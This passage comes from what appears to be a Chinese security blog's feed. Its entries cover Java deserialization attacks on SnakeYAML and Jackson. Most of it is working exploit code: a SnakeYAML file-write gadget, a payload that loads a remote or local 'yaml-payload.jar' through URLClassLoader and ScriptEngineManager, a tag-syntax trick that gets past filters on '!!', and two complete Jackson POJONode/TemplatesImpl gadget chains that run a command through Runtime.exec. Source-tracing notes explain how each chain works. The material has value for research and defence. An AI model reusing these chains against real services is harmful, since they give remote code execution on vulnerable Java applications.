class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> createPoc(<span class="hljs-string">&quot;E:/flag.txt&quot;</span>, <span class="hljs-string">&quot;E:/a.txt&quot;</span>);<br>        System.out.println(poc);<br><span class="hljs-comment">//        Yaml yaml = new Yaml();</span><br><span class="hljs-comment">//        yaml.load(poc);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">createPoc</span><span class="hljs-params">(String src, String path)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] file = JavaUtils.getBytesFromFile(src);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> file.length;<br>        <span class="hljs-type">byte</span>[] compressed = compress(file);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">b64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(compressed);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!sun.rmi.server.MarshalOutputStream &quot;</span> +<br>                <span class="hljs-string">&quot;[!!java.util.zip.InflaterOutputStream [&quot;</span> +<br>                    <span class="hljs-string">&quot;!!java.io.FileOutputStream [&quot;</span> +<br>                        <span class="hljs-string">&quot;!!java.io.File [\&quot;&quot;</span> + path + <span class="hljs-string">&quot;\&quot;],false],&quot;</span> +<br>                        <span class="hljs-string">&quot;!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span> + b64 + <span class="hljs-string">&quot; &#125;, &quot;</span> + length +<br>                        <span class="hljs-string">&quot;]]&quot;</span>;<br>        <span class="hljs-keyword">return</span> payload;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] compress(<span class="hljs-type">byte</span>[] input) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Deflater</span> <span class="hljs-variable">deflater</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Deflater</span>();<br>        deflater.setInput(input);<br>        deflater.finish();<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> (!deflater.finished()) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">compressedSize</span> <span class="hljs-operator">=</span> deflater.deflate(buffer);<br>            outputStream.write(buffer, <span class="hljs-number">0</span>, compressedSize);<br>        &#125;<br><br>        outputStream.close();<br>        <span class="hljs-keyword">return</span> outputStream.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>既然可以写文件，那就把jar写入目标环境，然后再通过URLClassloader本地加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> createPoc(<span class="hljs-string">&quot;./yaml-payload.jar&quot;</span>, <span class="hljs-string">&quot;E:/evil.jar&quot;</span>);<br>yaml.load(poc);<br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +<br>    <span class="hljs-string">&quot;!!java.net.URLClassLoader [[\n&quot;</span> +<br>    <span class="hljs-string">&quot;!!java.net.URL [\&quot;file:///E:/evil.jar\&quot;]\n&quot;</span> +<br>    <span class="hljs-string">&quot;]]\n&quot;</span> +<br>    <span class="hljs-string">&quot;]&quot;</span>;<br>yaml.load(s);<br></code></pre></td></tr></table></figure><h2 id="Yaml-load"><a href="#Yaml-load" class="headerlink" title="Yaml#load()"></a>Yaml#load()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">load</span><span class="hljs-params">(String yaml)</span> &#123;<br><span class="hljs-keyword">return</span> (T) loadFromReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamReader</span>(yaml), Object.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload存储于StreamReader的stream字段：</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155110646.png" alt="image-20240803155110646"></p><p>回到<code>loadFromReader()</code>，创建了一个Composer对象，并封装到<code>constructor</code>中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">loadFromReader</span><span class="hljs-params">(StreamReader sreader, Class&lt;?&gt; type)</span> &#123;<br>    <span class="hljs-type">Composer</span> <span class="hljs-variable">composer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Composer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserImpl</span>(sreader), resolver, loadingConfig);<br>    constructor.setComposer(composer);<br>    <span class="hljs-keyword">return</span> constructor.getSingleData(type);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进<code>getSingleData</code>：</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155215536.png" alt="image-20240803155215536"></p><p><code>getSingleNode()</code>将poc改造为如下：</p><blockquote><p>&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:javax.script.ScriptEngineManager, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:java.net.URLClassLoader, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:seq, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:java.net.URL, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.ScalarNode (tag&#x3D;tag:yaml.org,2002:str, value&#x3D;<a href="http://127.0.0.1:9999/yaml-payload.jar)%3E])%3E])%3E])%3E])%3E">http://127.0.0.1:9999/yaml-payload.jar)&gt;])&gt;])&gt;])&gt;])&gt;</a></p></blockquote><p>若过滤了<code>!!</code>，可利用此tag规则进行绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">!tag:yaml.org,<span class="hljs-number">2002</span>:javax.script.ScriptEngineManager [!tag:yaml.org,<span class="hljs-number">2002</span>:java.net.URLClassLoader [[!tag:yaml.org,<span class="hljs-number">2002</span>:java.net.URL [<span class="hljs-string">&quot;http://ip/yaml-payload.jar&quot;</span>]]]]<br></code></pre></td></tr></table></figure><p>接着调用<code>constructDocument()</code>对上面poc进行处理：</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155327831.png" alt="image-20240803155327831"></p><p>跟进<code>constructObject()</code> &#x3D;&gt; <code>constructObjectNoCheck()</code>：</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155346497.png" alt="image-20240803155346497"></p><p>node放入<code>recursiveObjects</code>，进入<code>constructor.construct(node)</code>：</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155404381.png" alt="image-20240803155404381"></p><p><img src="/2024/08/03/SnakeYaml/image-20240803155418302.png" alt="image-20240803155418302"></p><p>遍历节点，调用<code>constructObject()</code>又循环回去了</p><blockquote><p>constructObjectNoCheck()-&gt;</p><p>BaseConstructor#construct()-&gt;</p><p>Contructor#construct()-&gt;</p><p>递归Contructor#constructObject()</p></blockquote><p>上面的POC有5个node，所以循环5次。</p><p>先后进行了URL、URLClassLoader、ScriptEngineManager的实例化</p><p>注意这里实例化是有传参数(argumentList)的，把前一个类的实例化对象当作下个类构造器的参数。</p><p>最后进入ScriptEngineManager的无参构造器，连接上了上文的SPI机制。</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155529534.png" alt="image-20240803155529534"></p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247496898&idx=1&sn=9df9a236a3c437522bdf125cf92c6e24&chksm=c172e553f6056c4592696a15d5270e30386a229ca35d8eb1cf588498c95d78b28f2766975234&scene=27&key=7917b196593e1041903cc963f4d8e8dd309fc34822ec523c96ef6852b6eb00243ae09c3a475f21000c466a1481f5d9ef88661e5ccd3eae00b654271eecd790081cf9cb2b874e0566a9b1bf83ab3e3a9dffbce029a9983bd1e617a34873e1a5cf0d90ff63073904c1c64a7ab0832fd5396612ac69385a93896810c27b3466f6ca&ascene=0&uin=MzM0MTE3MTk2MQ==&devicetype=Windows+10+x64&version=6308011a&lang=zh_CN&exportkey=n_ChQIAhIQk1l7Og6o32ldfRBgt0m/7xLgAQIE97dBBAEAAAAAAFyoNDyY7FgAAAAOpnltbLcz9gKNyK89dVj0STE6v0lILRu1tKDn0ZDKVMzBwrLXZCB+mUzHXSOZsIYr0w0A/cuvTqwms4Rt/kjpf8zHxxTi8IwvjYn/DZ9Q33Hc5vfX2hilkR53helcExsLrLyslL/WBsef9XI/6wZMWmG6oy8JJGplsmLrW+xqvmnB4f5wILv176CzXoS3esuvsQ+hfcDKd/Efu5bUKYhs0ZoGh1vCyZD6VtP9NEg2tTCVHV3tJAqerIo+gJoEHIoL7rOFzs/q0qic&acctmode=0&pass_ticket=Q7/iUlx9i6XS/NSi17wpXoqBYZHAHgY0basv8D4BZIN+CoAkTfFeOqqNDBcbXW05phWaLHgqOHGN8cecKlsdgw==&wx_header=1&fontgear=2">SnakeYaml反序列化及不出网利用</a></p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/snakeyaml">SnakeYaml | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jackson</title>
    <link href="/2024/08/03/Jackson/"/>
    <url>/2024/08/03/Jackson/</url>
    
    <content type="html"><![CDATA[<p>Jackson跟fastjson很相近，所以前言还是从fastjson过渡过来。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要还是介绍Jackson原生反序列化引用。</p><p>这里从Fastjson重新开始说起：</p><p>在Fastjson中，<code>JSONArray</code>和<code>JSONObject</code>都实现了<code>Serializable</code>接口，这两个类的<code>toString</code>方法都能触发<code>toJSONString</code>的调用，要把一个JSON对象转字符串，必然涉及到对象属性的获取，会调用到对象的getter方法。</p><p>从1.2.49开始，<code>JSONArray</code>和<code>JSONObject</code>都实现了自己的<code>readObject</code>方法，自定义了一个<code>SecureObjectInputStream</code>并重写了<code>resolveClass</code>方法，里面调用了<code>checkAutoType</code>来对反序列化的类进行黑白名单检查。需要通过原生反序列化的引用机制来绕过。</p><p>利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">toString(e.g. BadAttributeValueExpException#readObject) <br>-&gt; toJSONString <br>-&gt; evil <span class="hljs-title function_">getter</span><span class="hljs-params">(e.g. TemplatesImpl#getOutputProperties)</span><br></code></pre></td></tr></table></figure><h2 id="Jackson-浅审"><a href="#Jackson-浅审" class="headerlink" title="Jackson 浅审"></a>Jackson 浅审</h2><p>Jackson的使用和Fastjson类似</p><table><thead><tr><th align="left">FastJson</th><th align="left">Jackson</th></tr></thead><tbody><tr><td align="left">JSONObject</td><td align="left">ObjectNode</td></tr><tr><td align="left">JSONArray</td><td align="left">ArrayNode</td></tr><tr><td align="left">JSON.parseObject静态调用</td><td align="left">ObjectMapper.readTree对象调用</td></tr></tbody></table><p>继承关系：<code>POJONode</code>-&gt;<code>ValueNode</code>-&gt;<code>BaseJsonNode</code> -&gt; <code>JsonNode</code></p><p>利用点在<code>BaseJsonNode#toString</code>，跟到后面 ，对于自定义的类使用<code>BeanSerializer</code>进行反序列化，调用<code>serializeFields</code>对属性进行还原时,<code>BeanPropertyWriter</code>调用<code>getter</code>。</p><p>还是用<code>TemplatesImpl#getOutputProperties</code>去打，但是这里直接反序列化会出现问题</p><blockquote><p>Failed to JDK serialize <code>POJONode</code> value: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[“outputProperties”])</p></blockquote><p>报错StackTrace：</p><p><img src="/2024/08/03/Jackson/image-20240803150351459.png" alt="image-20240803150351459"></p><p><code>invokeWriteReplace</code>判断<code>writeReplaceMethod</code>是否存在，存在则调用：</p><p><img src="/2024/08/03/Jackson/image-20240803150432510.png" alt="image-20240803150432510"></p><p>那么我们只需要使用javassist把这个类的<code>writeReplaceMethod</code>删掉即可。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// 去除BaseJsonNode的writeReplace方法</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span>ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(ctMethod);<br>        ctClass.toClass();<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd, <span class="hljs-string">&quot;val&quot;</span>, pojo);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(bd);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>稳定版本：<a href="https://xz.aliyun.com/t/12846?time__1311=GqGxuDcDRGexlxx2DUrED9G5Witkv5ox">从JSON1链中学习处理JACKSON链的不稳定性 - 先知社区 (aliyun.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JSON</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(makeTemplatesImplAopProxy(<span class="hljs-string">&quot;calc&quot;</span>));<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br><br>        serialize(val);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImplAopProxy</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(makeTemplatesImpl(cmd));<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImpl</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-keyword">return</span> templates;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于Jackson的getter利用，也可以看：</p><p><a href="https://z3r4y.blog.csdn.net/article/details/136889141">【Web】浅聊Jackson序列化getter的利用——POJONode-CSDN博客</a></p><p>这里Z3r4y师傅介绍了Jackson的getter利用Template和SignedObject二次反序列化的内容。</p><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson/jackson">Jackson的原生反序列化利用 | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson</title>
    <link href="/2024/08/01/fastjson/"/>
    <url>/2024/08/01/fastjson/</url>
    
